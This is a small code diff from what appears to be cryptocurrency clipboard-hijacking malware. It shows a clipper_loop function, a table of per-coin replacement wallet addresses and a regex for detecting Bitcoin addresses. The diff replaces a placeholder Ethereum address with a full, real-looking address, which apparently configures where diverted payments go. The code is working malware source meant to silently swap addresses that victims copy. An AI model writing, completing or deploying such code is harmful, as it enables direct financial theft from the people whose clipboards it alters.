@@ -250,7 +250,7 @@ def clipper_loop():
         time.sleep(1.5)
 
 CLIP_WALLETS = {
-    "BTC": "bc1xxx", "ETH": "0xabc", "XRP": "rxyz", "LTC": "ltc1xyz", "BCH": "qxyxyxy", "XMR": "4xxxxx"
+    "BTC": "bc1xxx", "ETH": "0x9e6b499df50c4d9fe9b1622b2c2a17e156c9963e", "XRP": "rxyz", "LTC": "ltc1xyz", "BCH": "qxyxyxy", "XMR": "4xxxxx"
 }
 CLIP_PATTERNS = {
     "BTC": r"(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}",
